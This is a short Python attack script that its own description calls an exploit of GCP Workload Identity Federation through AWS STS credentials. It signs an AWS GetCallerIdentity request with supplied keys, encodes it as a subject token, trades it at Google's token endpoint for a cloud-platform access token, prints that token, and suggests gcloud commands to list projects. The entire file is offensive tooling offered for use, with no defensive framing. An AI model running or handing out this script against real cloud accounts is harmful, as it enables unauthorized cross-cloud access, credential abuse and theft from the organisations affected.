import json
import boto3
import requests
import argparse
import base64
from botocore.auth import SigV4Auth
from botocore.awsrequest import AWSRequest
from botocore.session import get_session

def parse_args():
    parser = argparse.ArgumentParser(description="Exploit GCP Workload Identity Federation via AWS STS credentials")
    parser.add_argument('--wif', required=True, help='Path to the external_account JSON file')
    parser.add_argument('--aws-access', required=True, help='AWS Access Key ID')
    parser.add_argument('--aws-secret', required=True, help='AWS Secret Access Key')
    parser.add_argument('--aws-token', help='AWS Session Token (optional)', default=None)
    parser.add_argument('--region', help='AWS Region (optional)', default=None)
    return parser.parse_args()

def sign_get_caller_identity(region, access_key, secret_key, session_token):
    session = get_session()
    creds = boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=session_token,
        region_name=region
    ).get_credentials().get_frozen_credentials()

    request = AWSRequest(
        method="POST",
        url=f"https://sts.{region}.amazonaws.com/",
        data="Action=GetCallerIdentity&Version=2011-06-15",
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    SigV4Auth(creds, "sts", region).add_auth(request)
    return request

def build_subject_token(request):
    headers = request.headers
    parts = [
        "POST\n/",
        "host:sts.amazonaws.com",
        "x-amz-date:" + headers["X-Amz-Date"]
    ]
    if "X-Amz-Security-Token" in headers:
        parts.append("x-amz-security-token:" + headers["X-Amz-Security-Token"])
        header_order = "host;x-amz-date;x-amz-security-token"
    else:
        header_order = "host;x-amz-date"

    parts.append("")  # blank line
    parts.append(header_order)
    parts.append(request.body.decode() if hasattr(request.body, 'decode') else request.body)
    return base64.b64encode("\n".join(parts).encode()).decode()

def exchange_for_gcp_token(subject_token, wif_config):
    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "audience": wif_config["audience"],
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
        "subject_token_type": wif_config["subject_token_type"],
        "subject_token": subject_token
    }

    resp = requests.post(wif_config["token_url"], data=payload)
    if resp.ok:
        return resp.json()["access_token"]
    else:
        raise Exception(f"[!] Failed to exchange token: {resp.status_code} {resp.text}")

def main():
    args = parse_args()

    with open(args.wif, 'r') as f:
        wif_config = json.load(f)

    region = args.region
    if not region:
        # Try to get from metadata
        print("[*] Auto-detecting region from metadata...")
        region = requests.get(wif_config['credential_source']['region_url']).text[:-1]

    print(f"[*] Using AWS region: {region}")
    request = sign_get_caller_identity(region, args.aws_access, args.aws_secret, args.aws_token)
    subject_token = build_subject_token(request)

    print("[*] Exchanging subject_token with Google STS...")
    access_token = exchange_for_gcp_token(subject_token, wif_config)

    print("\n[+] GCP Access Token:")
    print(access_token)
    print("\n[*] Use it like:")
    print(f"gcloud auth activate-access-token {access_token}")
    print("gcloud projects list")

if __name__ == "__main__":
    main()